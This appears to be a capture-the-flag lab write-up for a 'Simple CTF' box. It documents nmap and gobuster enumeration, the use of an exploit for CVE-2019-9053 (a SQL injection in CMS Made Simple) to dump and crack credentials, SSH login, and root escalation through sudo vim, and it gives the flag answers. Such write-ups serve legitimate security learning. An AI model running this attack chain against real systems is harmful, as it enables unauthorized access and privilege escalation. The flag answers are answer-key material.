# Simple ctf

## 1 -  How many services are running under port 1000?

Run nmap

```
nmap -sC -sV -oN nmap/inital_setup $IP

21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.128.84
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Answer: 2 services (ftp, ssh)

Can also see that ftp can be accessed with anonymous mode and there is a robots.txt file 

Potential user: mike
Service running: openemr-5_0_1_3 
FTP: has a file (pub) - could not get the file, it hangs (passive mode)

## 2 - What is running on the higher port?

```
ssh
```

## 3 - What's the CVE you're using against the application? 

after running 

```
nmap --script=vuln $IP

Found:
Slowloris (but not the CVE needed)
####################################
nmap --script=vulners $IP

Found:
CVE for openssh (not the CVE needed)
Bunch of apache CVE's (none is the one needed)
```

Since none is, i ran a gobuster with wordlist 2.3-medium but did not found anything so i ran with common.txt

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u $IP -o gobuster/scan_1

/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200) -> apache default page
/robots.txt (Status: 200)
/server-status (Status: 403)
/simple (Status: 301) -> CMS made simple running VERSION: 2.2.8
```
Now i ran gobuster on the /simple folder and found alot of pages

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $IP/simple -o gobuster/scan_2

/modules (Status: 301)
/uploads (Status: 301)
/doc (Status: 301)
/admin (Status: 301)
/assets (Status: 301)
/lib (Status: 301)
```

Also in the page content says: 

```
If this is your site click here to login.
Redirects to page: /simple/admin/login.php
```

This may be an SQLInjection vuln.... lets search

```
CVE mitre -> search cms 2.2.8 -> CVE-2019-9053 (SQLI)
```

### Answer: CVE-2019-9053

## 4 - To what kind of vulnerability is the application vulnerable?

### Answer: SQLI

## 5 - Whats the password?

Use the exploit...

```
set TIME = 2 (to be safe because of the time attack)
python3 cms.py -u http://$IP/simple --crack -w best110.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

## 6 - Where can you login with the details obtained?

```
ssh 

ssh mitch@$IP -p 2222
```

## 7 - What's the user flag?

```
pwd /home/mitch/user.txt

G00d j0b, keep up!
```

## 8 - Is there any other user in the home directory? What's its name?

```
sunbath
```

## 9 - What can you leverage to spawn a privileged shell?

```
sudo -l

(root) NOPASSWD: /usr/bin/vim
```

### Answer: vim

## 10 - What's the root flag?

use gtfo bins to check vim

```
sudo vim
:shell=/bin/sh
:shell

whoami
# root

cd /root
cat root.txt
```

### Answer: W3ll d0n3. You made it!